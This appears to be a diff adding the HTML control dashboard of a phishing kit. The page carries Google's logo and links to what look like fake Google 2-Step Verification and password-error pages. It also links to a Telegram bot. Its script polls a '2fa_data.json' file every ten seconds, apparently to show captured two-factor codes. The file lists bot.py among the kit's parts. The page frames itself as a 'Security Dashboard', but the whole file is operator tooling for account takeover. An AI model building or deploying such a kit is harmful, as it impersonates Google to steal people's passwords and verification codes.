@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Security Bot Dashboard</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+    body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+    .container { max-width: 600px; width: 100%; background: white; border-radius: 16px; padding: 40px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+    .logo { text-align: center; margin-bottom: 30px; }
+    .logo img { width: 72px; height: 72px; }
+    .title { font-size: 28px; font-weight: 600; text-align: center; color: #202124; margin-bottom: 8px; }
+    .subtitle { text-align: center; color: #5f6368; font-size: 16px; margin-bottom: 30px; }
+    .status-card { background: #f8f9fa; border-radius: 8px; padding: 16px; margin-bottom: 24px; border: 1px solid #e8eaed; }
+    .status-card .label { font-size: 12px; color: #5f6368; text-transform: uppercase; letter-spacing: 0.5px; }
+    .status-card .value { font-size: 16px; font-weight: 500; color: #202124; margin-top: 4px; }
+    .status-card .value.online { color: #1e8e3e; }
+    .status-card .value.offline { color: #d93025; }
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
+    .card-link { background: #f8f9fa; border: 1px solid #e8eaed; border-radius: 8px; padding: 20px; text-align: center; text-decoration: none; color: #202124; transition: all 0.3s ease; cursor: pointer; }
+    .card-link:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); border-color: #1a73e8; }
+    .card-link .icon { font-size: 32px; margin-bottom: 8px; display: block; }
+    .card-link .name { font-size: 14px; font-weight: 500; }
+    .card-link .desc { font-size: 12px; color: #5f6368; margin-top: 4px; }
+    .card-link.google { border-left: 4px solid #1a73e8; }
+    .card-link.error { border-left: 4px solid #d93025; }
+    .card-link.data { border-left: 4px solid #e65100; }
+    .footer { text-align: center; margin-top: 24px; padding-top: 20px; border-top: 1px solid #e8eaed; font-size: 12px; color: #5f6368; }
+    .btn-telegram { background: #0088cc; color: white; padding: 12px 32px; border-radius: 8px; text-decoration: none; display: inline-block; font-weight: 500; margin: 16px 0; }
+    @media (max-width: 480px) { .container { padding: 24px; } .grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="logo"><img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" /></div>
+  <div class="title">🔐 Security Dashboard</div>
+  <div class="subtitle">Control your Google 2FA & Security Pages</div>
+  <div class="status-card">
+    <div class="label">Bot Status</div>
+    <div class="value online" id="botStatus">● Online</div>
+  </div>
+  <div class="grid">
+    <a href="google_2fa_page.html" class="card-link google">
+      <span class="icon">📱</span>
+      <div class="name">Google 2FA Page</div>
+      <div class="desc">2-Step Verification</div>
+    </a>
+    <a href="password_error_page.html" class="card-link error">
+      <span class="icon">❌</span>
+      <div class="name">Password Error Page</div>
+      <div class="desc">Error notifications</div>
+    </a>
+    <a href="#" class="card-link data" onclick="refreshData()">
+      <span class="icon">📊</span>
+      <div class="name">View Data</div>
+      <div class="desc">Check 2fa_data.json</div>
+    </a>
+    <a href="#" class="card-link" style="border-left: 4px solid #0088cc;" onclick="window.open('https://t.me/YOUR_BOT_USERNAME', '_blank')">
+      <span class="icon">🤖</span>
+      <div class="name">Open Telegram Bot</div>
+      <div class="desc">Chat with your bot</div>
+    </a>
+  </div>
+  <div style="text-align: center; margin: 16px 0;">
+    <a href="#" class="btn-telegram" onclick="window.open('https://t.me/YOUR_BOT_USERNAME', '_blank')">🤖 Open Telegram Bot</a>
+  </div>
+  <div class="footer">
+    <p>📁 Files: bot.py • google_2fa_page.html • password_error_page.html • index.html</p>
+    <p style="margin-top: 8px;"><a href="#" onclick="refreshData(); return false;">🔄 Refresh Data</a></p>
+  </div>
+</div>
+<script>
+  function refreshData() {
+    fetch('2fa_data.json?' + new Date().getTime())
+      .then(response => response.json())
+      .then(data => {
+        const status = document.getElementById('botStatus');
+        if (data && data.last_updated) {
+          status.textContent = '● Online (Updated: ' + new Date(data.last_updated).toLocaleTimeString() + ')';
+          status.className = 'value online';
+        } else {
+          status.textContent = '● Offline - No data';
+          status.className = 'value offline';
+        }
+      })
+      .catch(() => {
+        const status = document.getElementById('botStatus');
+        status.textContent = '● Offline - Data file not found';
+        status.className = 'value offline';
+      });
+  }
+  setInterval(refreshData, 10000);
+  refreshData();
+  console.log('📊 Security Dashboard loaded!');
+</script>
+</body>
+</html>
